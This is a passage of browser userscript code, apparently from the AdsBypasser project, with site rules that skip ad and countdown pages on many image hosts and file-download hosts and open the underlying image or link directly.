      /^www\.hentai-king\.online$/,
    ],
    path: /^\/i\/.+\.php$/,
    query: /f=(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openImage('f/' + m.query[1]);
  },
});
(function () {
  'use strict';
  var PATH_RULE = /^\/([0-9a-zA-Z]+)(\.|\/|$)/;
  $.register({
    rule: {
      host: [
        /^img(universal|paying|mega|zeus|monkey|trex|ve|dew|diamond)\.com$/,
        /^(www\.)?imgsee\.me$/,
        /^img(click|maid)\.net$/,
        /^(uploadrr|imageeer|imzdrop|www\.uimgshare|pic-maniac|hulkimge)\.com$/,
        /^imgdrive\.co$/,
        /^cuteimg\.cc$/,
        /^img(tiger|gold)\.org$/,
        /^myimg\.club$/,
        /^foxyimg\.link$/,
        /^(core|iron)img\.net$/,
      ],
      path: PATH_RULE,
    },
    ready: function (m) {
      helper(m.path[1], getNext1);
    },
  });
  $.register({
    rule: {
      host: [
        /^imgview\.net$/,
        /^img(maze|outlet)\.com$/,
      ],
      path: PATH_RULE,
    },
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      var d = $('div[id^="imageviewi"]');
      waitDOM(d, function (node) {
        return node.nodeName === 'FORM' && $.$('input[name="id"]', node);
      }).then(function (node) {
        node.submit();
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  $.register({
    rule: {
      host: /^img(rock|town)\.net$/,
      path: PATH_RULE,
    },
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      getAmbiguousForm('td:nth-child(2) > center > div[id]').then(function (node) {
        node.submit();
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  $.register({
    rule: {
      host: /^imgoutlet\.co$/,
      path: PATH_RULE,
    },
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      getAmbiguousForm('.inner > center > div[id]').then(function (node) {
        node.submit();
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  $.register({
    rule: {
      host: /^chronos\.to$/,
      path: PATH_RULE,
    },
    ready: function (m) {
      helper(m.path[1], getNext2);
    },
  });
  $.register({
    rule: {
      host: /^imgfiles\.org$/,
      path: PATH_RULE,
    },
    ready: function (m) {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      var f = $('form');
      f.submit();
    },
  });
  $.register({
    rule: 'http://imgview.net/tpind.php',
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src, {replace: true});
        return;
      }
      _.wait(500).then(function () {
        var d = $('div[id^="imageviewi"] input[type="submit"][style=""]');
        d = d.parentNode;
        d.submit();
      });
    },
  });
  $.register({
    rule: /^http:\/\/imgdragon\.com\/(getfil\.php|dl)$/,
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      _.wait(500).then(function () {
        var f = $('#ContinueFRM');
        f.submit();
      });
    },
  });
  function waitDOM (element, fn) {
    return _.D(function (resolve, reject) {
      var observer = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          if (mutation.type !== 'childList') {
            return;
          }
          var result = _.C(mutation.addedNodes).find(function (child) {
            return fn(child) ? child : _.none;
          });
          if (!result) {
            return;
          }
          observer.disconnect();
          resolve(result.payload);
        });
      });
      observer.observe(element, {
        childList: true,
      });
    });
  }
  function getAmbiguousForm (selector) {
    var d = $(selector);
    var visibleClasses = null;
    return waitDOM(d, function (node) {
      if (node.nodeName === 'STYLE') {
        visibleClasses = parseStyle(node);
        return false;
      }
      if (node.nodeName === 'FORM' && node.offsetParent !== null) {
        return visibleClasses.some(function (class_) {
          var isVisible = node.classList.contains(class_);
          if (!isVisible) {
            return false;
          }
          var button = $.$('input[type="submit"]', node);
          if (!button) {
            return false;
          }
          return button.style.display !== 'none';
        });
      }
      return false;
    });
  }
  function parseStyle (style) {
    style = style.textContent;
    var pattern = /\.(\w+)\{visibility:initial;\}/g;
    var rv = null;
    var classes = [];
    while ((rv = pattern.exec(style)) !== null) {
      classes.push(rv[1]);
    }
    return classes;
  }
  function go (id, pre, next) {
    $.openLink('', {
      post: {
        op: 'view',
        id: id,
        pre: pre,
        next: next,
        adb: '0',
      },
    });
  }
  function getNext1 (i) {
    return i.value;
  }
  function getNext2 (i) {
    var next = i.onclick && i.onclick.toString().match(/value='([^']+)'/);
    if (next) {
      next = next[1];
      return next;
    } else {
      return i.value;
    }
  }
  function helper (id, getNext) {
    var recaptcha = $.$('#recaptcha_widget, #captcha');
    if (recaptcha) {
      _.info('stop because recaptcha');
      return;
    }
    var i = $.$('input[name="next"]');
    if (i) {
      var next = getNext(i);
      go(id, $('input[name="pre"]').value, next);
      return;
    }
    i = $.$('img.pic');
    if (i) {
      $.openImage(i.src);
      return;
    }
    _.info('do nothing');
  }
})();
$.register({
  rule: {
    host: /^(imgsure|picexposed)\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('img.pic');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imgtheif.com/image/*.html',
  ready: function () {
    'use strict';
    var a = $('div.content-container a');
    $.openImage(a.href);
  },
});
$.register({
  rule: {
    host: /^imgtorrnt\.in$/,
    path: /^\/view\.php$/,
    query: /^\?id=.*/,
  },
  ready: function () {
    'use strict';
    var img = $('center div table.tg tbody tr td center img');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^imgvault\.pw$/,
    path: /^\/view-image\//,
  },
  ready: function () {
    'use strict';
    var a = $('article div.span7 a[target="_blank"]');
    $.openImage(a.href);
  },
});
$.register({
  rule: 'http://ipic.su/?page=img&pic=*',
  ready: function () {
    'use strict';
    var i = $('#fz');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^javcity\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('.entry-content > h1:nth-child(1) > a:nth-child(1)');
    var url = a.onclick.toString();
    url = url.match(/window\.open\('([^']+)'\)/);
    if (!url) {
      _.info('pattern changed')
      return;
    }
    $.openImage(url[1]);
  },
});
$.register({
  rule: {
    host: /^keptarolo\.hu$/,
    path: /^(\/[^\/]+\/[^\/]+\.jpg)$/,
  },
  start: function (m) {
    'use strict';
    $.openImage('http://www.keptarolo.hu/kep' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /^lostpic\.net$/,
    query: /^\?photo=\d+$/,
  },
  ready: function () {
    'use strict';
    var i = $('img.notinline.circle');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function helper (m) {
    $.openImage('/images/' + m.query[1]);
  }
  $.register({
    rule: {
      host: [
        /^(hentai-hosting|miragepics|funextra\.hostzi|imgrex|cdn\.javtotal|img3x)\.com$/,
        /^bilder\.nixhelp\.de$/,
        /^imagecurl\.(com|org)$/,
        /^imagevau\.eu$/,
        /^img\.deli\.sh$/,
        /^img(dream|soo|nm|silo)\.net$/,
        /^imgsicily\.it$/,
        /^www\.imghere\.net$/,
      ],
      path: /^\/viewer\.php$/,
      query: /file=([^&]+)/,
    },
    start: helper,
  });
  $.register({
    rule: {
      host: [
        /^(dwimg|imgsin)\.com$/,
        /^www\.pictureshoster\.com$/,
      ],
      path: /^\/viewer\.php$/,
      query: /file=([^&]+)/,
    },
    start: function (m) {
      $.openImage('/files/' + m.query[1]);
    },
  });
  $.register({
    rule: {
      host: [
        /^img(nip|central|cream)\.com$/,
        /^imageview\.me$/,
        /^244pix\.com$/,
        /^postimg\.net$/,
      ],
      path: /^\/viewerr.*\.php$/,
      query: /file=([^&]+)/,
    },
    start: helper,
  });
  $.register({
    rule: [
      'http://www.overpic.net/viewer.php?file=*',
    ],
    ready: function () {
      var i = $('#main_img');
      $.openImage(i.src);
    },
  });
  $.register({
    rule: {
      host: /^dumppix\.com$/,
      path: /^\/viewer\.php$/,
      query: /file=([^&]+)/,
    },
    start: function (m) {
      $.openImage('/images/' + m.query[1], {
        referer: true,
      });
    },
  });
  $.register({
    rule: {
      host: /^xxxhost\.me$/,
      path: /^\/viewer\d+\.php$/,
      query: /file=([^&]+)/,
    },
    start: function (m) {
      $.openImage('files/' + m.query[1]);
    },
  });
})();
$.register({
  rule: {
    host: /^www\.mrjh\.org$/,
    path: /^\/gallery\.php$/,
    query: /^\?entry=(.+)$/,
  },
  ready: function (m) {
    'use strict';
    var url = m.query[1];
    $.openImage('/' + url);
  },
});
$.register({
  rule: {
    host: /^www\.noelshack\.com$/
  },
  ready: function () {
    var i = $('#elt_to_aff');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://pic-money.ru/*.html',
  ready: function () {
    'use strict';
    var f = document.forms[0];
    var sig = $('input[name="sig"]', f).value;
    var pic_id = $('input[name="pic_id"]', f).value;
    var referer = $('input[name="referer"]', f).value;
    var url = _.T('/pic.jpeg?pic_id={pic_id}&sig={sig}&referer={referer}');
    $.openImage(url({
      sig: sig,
      pic_id: pic_id,
      referer: referer,
    }));
  },
});
$.register({
  rule: 'http://www.pic-upload.de/view-*.html',
  ready: function () {
    'use strict';
    $.removeNodes('.advert');
    var i = $('img.preview_picture_2b, img.original_picture_2b');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^pic(2profit|p2)\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('form > #d1 ~ input[name=bigimg]');
    $.openImage(i.value);
  },
});
$.register({
  rule: {
    host: /^pic(4|5)you\.ru$/
  },
  ready: function () {
  if ($.$('#d1 > img') != null) {
    var URLparams = location.href.split("/", 5);
    var next = URLparams[0] + '/' + URLparams[1] + '/' + URLparams[2] + '/' + URLparams[3] + '/' + URLparams[4] + '/1/';
    $.setCookie('p4yclick','1');
    $.openLink(next);
  } else {
    var i = $('#d1 img').src;
    $.openImage(i);
  }
  },
});
$.register({
  rule: {
    host: /^(www\.)?piccash\.net$/
  },
  ready: function () {
  var i = $('.container > img');
  var m =i.onclick.toString().match(/mshow\('([^']+)'\);/);
  $.openImage(m[1]);
  },
});
$.register({
  rule: [
    'http://amateurfreak.org/share-*.html',
    'http://amateurfreak.org/share.php?id=*',
    'http://images.maxigame.by/share-*.html',
    'http://picfox.org/*',
    'http://www.euro-pic.eu/share.php?id=*',
    'http://www.gratisimage.dk/share-*.html',
    'http://xxx.freeimage.us/share.php?id=*',
    'http://npicture.net/share-*.html',
    'http://www.onlinepic.net/share.php?id=*',
    'http://www.pixsor.com/share.php?id=*',
    'http://www.pixsor.com/share-*.html',
    'http://pixsor.com/XXX/share-*.html',
    'http://holdthemoan.net/x/share-*.html',
    'http://imgurx.net/x/share-*.html',
    'http://www.imgz.pw/share-*.html',
  ],
  ready: function () {
    'use strict';
    var o = $('#iimg');
    $.openImage(o.src);
  },
});
$.register({
  rule: 'http://picmoe.net/d.php?id=*',
  ready: function () {
    'use strict';
    var i = $('img');
    $.openImage(i.src);
  },
});
$.register({
  rule: [
    'http://pics-money.ru/allpicfree/*',
    'http://www.pics-money.ru/allimage/*',
  ],
});
$.register({
  rule: {
    host: /^pics-money\.ru$/,
    path: /^\/v\.php$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var i = $('center img:not([id])');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^www\.pics-money\.ru$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var i = $('#d1 img');
    i = i.onclick.toString();
    i = i.match(/mshow\('(.+)'\)/);
    i = i[1];
    $.openImage(i);
  },
});
$.register({
  rule: 'http://picshare.geenza.com/pics/*',
  ready: function () {
    'use strict';
    var i = $('#picShare_image_container');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^picstream\.tv$/,
    path: /^\/.*\/.*\.html$/,
  },
  ready: function () {
    'use strict';
    var img = $('#view1 > div:nth-child(1) > img:nth-child(1)');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?pimpandhost\.com$/,
    path: /^\/image\//,
  },
  ready: function () {
    'use strict';
    var a = $('#image_original');
    var el = document.createElement('div');
    el.innerHTML = a.value;
    var img = $('img', el);
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^pixhub\.eu$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe, .adultpage, #FFN_Banner_Holder');
    var i = $('.image-show img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?pixroute\.com$/
  },
  ready: function () {
    'use strict';
    var o = $('.fr4me > div:nth-child(20) > a:nth-child(1) > img:nth-child(1)');
    $.openImage(o.src);
  },
});
$.register({
  rule: {
    host: /^www\.pixsense\.net$/,
    path: /^\/site\/v\/\d+$/,
  },
  ready: function () {
    'use strict';
    var a = $('#myUniqueImg').parentNode;
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^pixxxels\.org$/,
  },
  ready: function () {
    'use strict';
    var img = $.$('#main-image');
    $.openImage(img.dataset.full);
  },
});
$.register({
  rule: {
    host: /^www\.pornimagex\.com$/,
    path: /^\/image\/.*$/,
  },
  ready: function () {
    'use strict';
    var img = $('#fixed img.border2px');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^prntscr\.com$/
  },
  ready: function () {
    'use strict';
    var i = $('#screenshot-image');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^pronpic\.org$/,
  },
  ready: function () {
    'use strict';
    var urlBaseImg = $('table.new_table2:nth-child(1) img.link');
    var baseUrl = urlBaseImg.src.split('th_')[0];
    var img = $('table.new_table2:nth-child(2) img.link');
    var url = baseUrl + img.src.split('th_')[1];
    $.openImage(url);
  },
});
$.register({
  rule: {
    host: /^(qrrro|greenpiccs)\.com$/,
    path: /^(\/images\/.+)\.html$/,
  },
  start: function (m) {
    'use strict';
    $.openImage(m.path[1]);
  },
});
$.register({
  rule: {
    host: /^radikal\.ru$/,
    path: /^\/big\//,
  },
  ready: function () {
    'use strict';
    var i = $.$('.base-page_center > div:nth-child(2) > img:nth-child(1)');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function action (firstSelector, secondSelector) {
    $.removeNodes('iframe, #adblock_detect, .popupOverlay');
    var node = $.$(firstSelector);
    if (node) {
      _.wait(500).then(function () {
        node.removeAttribute('disabled');
        return _.wait(500);
      }).then(function () {
        node.focus();
        node.click();
        node.click();
        node.click();
      });
      return;
    }
    var i = $(secondSelector);
    $.openImage(i.src);
  }
  var defaultAction = _.P(action, '#continuetoimage > form input', 'img[class^=centred]');
  $.register({
    rule: [
      {
        host: [
          /^image(ontime|corn|picsa|horse|decode)\.com$/,
          /^(zonezeed|zelje|croft|myhot|bok|hostur|greasy|dam)image\.com$/,
          /^img(icy|next|savvy|\.spicyzilla|twyti|xyz|devil|tzar|ban|pu|beer|wet|tornado|kicks|nimz|binbou|2share|22|cover|hit|main|trial|blank|reputa|fapper|reality)\.com$/,
          /^(i\.)?imgseeds?\.com$/,
          /^img-(zone|planet|pay|uploads)\.com$/,
          /^www\.img(blow|lemon|4sharing)\.com$/,
          /^www\.imagefolks\.com$/,
          /^www\.freephotohostin\.com$/,
          /^(www\.)?imgult\.com$/,
          /^xxx(imagenow|screens)\.com$/,
          /^xxxsparrow?\.com$/,
          /^(playimg|picstwist|ericsony|wpc8|uplimg|lexiit|thumbnailus|newimagepost|fapingpics|dimtus|tinizo)\.com$/,
          /^((i|hentai)\.)?imgslip\.com$/,
          /^(i|xxx)\.hentaiyoutube\.com$/,
          /^(go|er)imge\.com$/,
          /^(like\.)?08lkk\.com$/,
          /^nim(plus|zshare)\.com$/,
          /^nudeximg\.com$/,
          /^img(serve|coin|fap|candy|master|-view|run|boom|project|python|pics|pix)\.net$/,
          /^(imagesouls|naughtygate|gallerycloud|imagelaser|picture-bang|project-photo|pix-link|funimg|golfpit|xximg)\.net$/,
          /^(shot|adult)img\.org$/,
          /^image(\.adlock|on|team)\.org$/,
          /^(voyeur|drag|teen|mega)image\.org$/,
          /^teenshot\.org$/,
          /^img(studio|spot)\.org$/,
          /^www\.hotimage\.uk$/,
          /^(hotimages|55888)\.eu$/,
          /^img(cloud|mag)\.co$/,
          /^pixup\.us$/,
          /^(bulkimg|photo-up|myimg|pop-img|img-pop|ads-img)\.info$/,
          /^vava\.in$/,
          /^(pixxx|picspornfree|imgload|fapat)\.me$/,
          /^(domaink|pic2pic|porno-pirat|24avarii|loftlm|18pron|imgplus)\.ru$/,
          /^imgease\.re$/,
          /^goimg\.xyz$/,
          /^(pic2pic|picz)\.site$/,
          /^darpix\.ga$/,
          /^sxpics\.nl$/,
          /^darpix\.desi$/,
          /^pic4you\.top$/,
          /^imgsen\.se$/,
          /^ipicture\.su$/,
          /^acidimg\.cc$/,
        ],
        path: /^\/img-.*\.html/,
      },
      {
        host: [
          /^img(run|twyti)\.net$/,
          /^imgtwyti\.com$/,
          /^hentai-(pop|baka)\.com$/,
          /^star-hentai\.com$/,
          /^(jav|img)-hentai\.host$/,
          /^hentai-king\.host$/,
          /^img-king\.xyz$/,
        ],
        path: /^\/[ti]\/img-.*\.html/,
      },
      {
        host: /^imgking\.co$/,
        path: /^\/img4?-.*\.html/,
      },
      {
        host: /^imgbb\.net$/,
        path: /^\/.-.+$/,
      },
      {
        host: /^cdn\.javtotal\.com$/,
        path: /^\/img\/.+$/,
      },
      {
        host: /^imgtor\.pw$/,
        path: /^\/img2\/.+$/,
      },
      {
        host: /^ima\.gy$/,
        path: /^\/i\/.+$/,
      },
    ],
    ready: defaultAction,
  });
  $.register({
    rule: {
        host: /^imgtor\.pw$/,
        path: /^\/img\/.*$/,
    },
    start: function (m) {
      var imageUrl = 'http://' + m.host[0] + m.path[0].replace("img","img2");
      $.openLink(imageUrl);
    },
  });
  $.register({
    rule: {
      host: /^imgrat\.com$/,
      path: /^\/img-.*\.html/,
    },
    ready: _.P(action, '#close', '#main_image img.center-block.img-responsive'),
  });
  $.register({
    rule: {
      host: [
        /^imageporn\.eu$/,
        /^imgzizi\.xyz$/,
      ],
      path: /^\/img-.*\.html/,
    },
    start: function () {
      $.window.document.createElement = null;
    },
    ready: defaultAction,
  });
  $.register({
    rule: {
      host: [
        /^(www\.)?img(adult|wallet|taxi)\.com$/,
        /^(www\.)?imgdrive\.net$/,
      ],
      path: /^\/img-.*\.html$/,
    },
    start: function () {
      var c = $.getCookie('ibpuc');
      if (c) {
        return;
      }
      $.post(window.location.href.toString(), {
        cti: 1,
        ref: '',
        rc: 1,
        rp: 1,
        bt: 0,
        bw: 'edge',
      }).then(function (data) {
        window.location.reload();
      });
    },
    ready: function () {
      $.removeNodes('iframe');
      var node = $.$('#continuetoimage > form input');
      if (node) {
        node.click();
        node.click();
        return;
      }
      $.resetCookies();
      var i = $('img[class^=centred]');
      $.openImage(i.src);
    },
  });
  function helper () {
    $.window.setTimeout = _.nop;
    return $.get(window.location.toString()).then(function (data) {
      return $.toDOM(data);
    });
  }
  $.register({
    rule: {
      host: /^08lkk\.com$/,
      path: /^\/Photo\/img-.+\.html$/,
    },
    start: function () {
      helper().then(function (page) {
        var i = $('img[class^=centred]', page);
        $.openImage(i.src);
      });
    },
  });
  $.register({
    rule: {
      host: /^08lkk\.com$/,
      path: /^\/\d+\/img-.*\.html$/,
    },
    start: function () {
      helper().then(function (page) {
        var bbcode = $.$('#imagecodes input', page);
        bbcode = bbcode.value.match(/.+\[IMG\]([^\[]+)\[\/IMG\].+/);
        bbcode = bbcode[1];
        bbcode = bbcode.replace('small', 'big');
        $.openImage(bbcode);
      });
    },
  });
  $.register({
    rule: [
      {
        host: /^imgking\.co$/,
        path: /^\/imgs-.*\.html/,
      },
      {
        host: [
          /^img(kings|prime)\.com$/,
          /^imagerar\.com$/,
        ],
        path: /^\/img-.*\.html/,
      },
    ],
    ready: function () {
      var url = $.window.linkid;
      $.openImage(url);
    },
  });
  $.register({
    rule: {
      host: /^imgkings\.com$/,
      path: /^\/img2-.*\.html/,
    },
    ready: defaultAction,
  });
  $.register({
    rule: [
      {
        host: /^imagerar\.com$/,
        path: /^\/img2-/,
      },
      {
        host: /^imgking\.co$/,
        path: /^\/img[v3]-.*\.html/,
      },
      {
        host: /^imgprime\.com$/,
        path: /^\/img3-.*\.html$/,
      },
    ],
    ready: function () {
      var i = $('img[alt]');
      $.openImage(i.src);
    },
  });
  $.register({
    rule: {
      host: /^img\.yt$/,
      path: /^\/img-.*\.html/,
    },
    ready: _.P(action, '#continuebutton, #continuetoimage input[type="submit"]', 'img[class^=centred]'),
  });
})();
$.register({
  rule: 'http://www.subirimagenes.com/*.html',
  ready: function () {
    'use strict';
    var i = $('#ImagenVisualizada');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://tinypic.com/view.php?pic=*',
  ready: function () {
    'use strict';
    var i = $('#imgElement');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^www\.turboimagehost\.com$/,
    path: /^\/p\//,
  },
  ready: function () {
    'use strict';
    var i = $('#imageid');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://vvcap.net/db/*.htp',
  ready: function () {
    'use strict';
    var i = $('img');
    $.openImage(i.src, {
      replace: true,
    });
  },
});
$.register({
  rule: {
    host: /^x\.pixfarm\.net$/,
    path: /^\/sexy\/\d+\/\d+\/.+\.html$/,
  },
  ready: function () {
    'use strict';
    var i = $('img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^akoam\.com$/,
    path: /^\/download\//,
  },
  start: function () {
    'use strict';
    var location_link = location.hash;
    $.post(location_link).then(function (data) {
      data = JSON.parse(data);
      if (!data.hash_data) {
        _.warn('rule changed');
        return;
      }
      $.openLink(data.direct_link);
    });
  },
});
$.register({
  rule: {
    host: /^www\.anafile\.com$/,
  },
  ready: function () {
    'use strict';
    var b = $.$('#btn_download');
    if (b) {
      b.disabled = false;
      $.removeNodes('div[align=center]');
      return;
    }
    b = $('#plans_free form [type=submit]');
    b.click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?arab\.sh$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('form[name=F1]');
    setTimeout(function() {
        f.submit();
    }, 20000);
  },
});
$.register({
  rule: {
    host: /^(www\.)?coolrom\.com$/,
    path: /^\/dlpop\.php$/,
  },
  ready: function () {
    'use strict';
    var matches = $.searchScripts(/<form method="POST" action="([^"]+)">/);
    $.openLink(matches[1]);
  },
});
(function() {
  'use strict';
  $.register({
    rule: {
      host: /^(www\.)?dl-protect\.com$/,
      path: /\/[A-Z0-9]+/,
    },
    ready: function () {
      if ($.$('#captcha')) {
        return;
      }
      var f = $.$('form[name=ccerure]');
      if (f) {
        var observer = new MutationObserver(function (mutations) {
          var iIn = $('input[id=in]');
          for (var i = 0; i < mutations.length; i++) {
            if (mutations[i].target.value && mutations[i].attributeName === 'value') {
              observer.disconnect();
              iIn.value = "Tracking too much hurts users' privacy";
              if (!canFastRedirect()) {
                return;
              }
              setTimeout(function() {
                f.submit();
              }, 600);
              break;
            }
          }
        });
        var iIn = $('input[id=in]');
        if (iIn.value) {
          setTimeout(function() {
            f.submit();
          }, 600);
        } else {
          observer.observe(iIn, {
            attributes: true,
          });
        }
        return;
      }
      var l = $.$$('#slinks > a');
      if (l.size() === 1) {
        $.openLink(l.at(0).href);
      }
    },
  });
  function canFastRedirect () {
    return !$.$('form[name=ccerure]').onsubmit && !$.$('form[name=ccerure] input[name=pwd]');
  }
})();
$.register({
  rule: {
    host: /^(www\.)?embedupload\.com$/,
    path: /^\/$/,
    query: /^\?\w{2}=\w+$/
  },
  ready: function () {
    'use strict';
    var downloadPage = $('.categories a[target=_blank]');
    $.openLink(downloadPage);
  },
});
$.register({
  rule: {
    host: /^www\.fileproject\.com\.br$/,
    path: /^\/files\/+/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/<a id="down" href="([^"]+)">/);
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?(firedrive|putlocker)\.com$/,
    path: /^\/file\/[0-9A-F]+$/,
  },
  ready: function () {
    'use strict';
    var c = $('#confirm_form');
    c.submit();
  },
});
$.register({
  rule: {
    host: /^iori\.us$/,
  },
  ready: function () {
    'use strict';
    var a = $('#wrapper .tombol a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?jheberg\.net$/,
    path: /^\/captcha\//,
  },
  ready: function () {
    'use strict';
    $('.dl-button').click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?jheberg\.net$/,
    path: /^\/redirect\//,
  },
  ready: function () {
    'use strict';
    $.removeAllTimer();
    var matches = $.searchScripts(/'slug':\s*'([^']+)',\s*'hoster':\s*'([^']+)'/);
    var slug = matches[1];
    var hoster = matches[2];
    $.post('/get/link/', {
      'slug': slug,
      'hoster': hoster
    }).then(function(response) {
      var respJSON = _.parseJSON(response);
      $.openLink(respJSON.url);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?larashare\.com$/,
    path: /^\/do\.php$/,
    query: /id=\d+/,
  },
  start: function () {
    'use strict';
    $.openLink(document.location.href.replace('id=','down='));
  },
});
$.register({
  rule: {
    host: /^(www\.)?maxmirror\.com$/,
    path: /^\/redirect\//,
  },
  ready: function () {
    'use strict';
    var l = $('#download_url > a');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?mirrorcreator\.com$/,
    path: /^\/showurl\.php$/,
  },
  ready: function () {
    'use strict';
    var a = $.$('#redirectlink a');
    if (a) {
      $.openLink(a.href);
      return;
    }
    a = $('#redirectlink > div.redirecturl');
    a = a.innerHTML;
    if (!a.match(/^http/)) {
      throw new _.AdsBypasserError('not a valid URL');
    }
    $.openLink(a);
  },
});
$.register({
  rule: {
    host: /^www\.multiupfile\.com$/,
    path: /^\/f\//,
  },
  ready: function () {
    'use strict';
    var f = $('#yw0');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^mylinkgen\.com$/,
    path: /^\/p\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/g/' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /^mylinkgen\.com$/,
    path: /^\/g\//,
  },
  ready: function () {
    'use strict';
    var a = $('#main-content a.btn.btn-default');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: [
      /^openload\.co$/,
      /^oload\.tv$/,
    ],
    path: /^\/f\/.*/,
  },
  start: function (m) {
    $.window.adblock = false;
    $.window.adblock2 = false;
    $.window.popAdsLoaded = true;
  },
  ready: function () {
    'use strict';
    setTimeout(function () {
      var timer = $('#downloadTimer');
      timer.style.display = 'none';
      var dlCtn = $('#realdl');
      dlCtn.style.display = 'inline-block';
      var dlBtn = $('a', dlCtn);
      var ePath = $('#streamurl');
      dlBtn.href = "/stream/" + ePath.textContent;
      var videoCtn = $.$('.videocontainer');
      if (videoCtn) {
        var overlay = $('#videooverlay', videoCtn);
        overlay.click();
        dlBtn.addEventListener('click', function (evt) {
          evt.preventDefault();
          var iframe = document.createElement('iframe');
          iframe.src = dlBtn.href;
          document.body.appendChild(iframe);
        });
        _.info(_.T('{0} -> {1}')(window.location, dlBtn.href));
        dlBtn.click();
      } else {
        $.openLink(dlBtn.href);
      }
    }, 500);
  }
});
$.register({
  rule: {
    host: /^(www\.)?upmirror\.info$/,
  },
  ready: function () {
    'use strict';
    $.setCookie('user', 'ppp');
    if ($.$('#countDownText')) {
        $.openLink(document.location.toString());
    }
  },
});
$.register({
  rule: {
    host: /^(www\.)?vidto\.me$/,
  },
  ready: function () {
    'use strict';
    var f = $('#btn_download').form;
    setTimeout(function() {
        f.submit();
    }, 6000);
  },
});
(function () {
  'use strict';
  var sUrl = '(\\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])';
  function isLink (text) {
    var rUrl = new RegExp(_.T('^{0}$')(sUrl), 'i');
    return rUrl.test(text);
  }
  function linkify (text) {
    var rUrl = new RegExp(sUrl, 'ig');
    return text.replace(rUrl, function(match) {
      return _.T("<a href='{0}'>{0}</a>")(match);
    });
  }
  $.register({
    rule: {
      host: /^(www\.)?([a-zA-Z0-9]+\.)?binbox\.io$/,
      path: /\/([a-zA-Z0-9]+)/,
      hash: /(?:#([a-zA-Z0-9]+))?/,
    },
    ready: function (m) {
      var sjcl = $.window.sjcl;
      var paste_id = m.path[1];
      var paste_salt = m.hash[1];
      var API_URL = _.T('https://binbox.io/{0}.json')(paste_id);
      $.get(API_URL, false, {
        Origin: _.none,
        Referer: _.none,
        Cookie: 'referrer=1',
        'X-Requested-With': _.none,
      }).then(function (pasteInfo) {
        pasteInfo = _.parseJSON(pasteInfo);
        if (!pasteInfo.ok) {
          throw new _.AdsBypasserError("error when getting paste information");
        }
        if (pasteInfo.paste.url) {
          $.openLink(pasteInfo.paste.url);
          return;
        }
        var raw_paste = sjcl.decrypt(paste_salt, pasteInfo.paste.text);
        if (isLink(raw_paste)) {
          $.openLink(raw_paste);
          return;
        }
        var elm = document.createElement('pre');
        elm.id = 'paste-text';
        elm.innerHTML = linkify(raw_paste);
        var frame = $('#paste-frame, #captcha-page');
        frame.parentNode.replaceChild(elm, frame);
      });
    },
  });
})();
$.register({
  rule: {
    host: /^(www\.)?pasted\.co$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('#captcha_overlay');
  },
});
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var _ = require('lodash');
      var core = require('./core.js');
      var misc = require('./misc.js');
      var dispatcher = require('./dispatcher.js');
      var modules = [misc, dispatcher].map(function (v) {
        return v.call(null, context, GM);
      });
      var $ = _.assign.apply(_, modules);
      return factory(context, GM, core, $);
    };
  } else {
    factory(context, {
      openInTab: GM_openInTab,
      registerMenuCommand: GM_registerMenuCommand,
    }, context._, context.$);
  }
}(this, function (context, GM, _, $) {
  'use strict';
  var window = context.window;
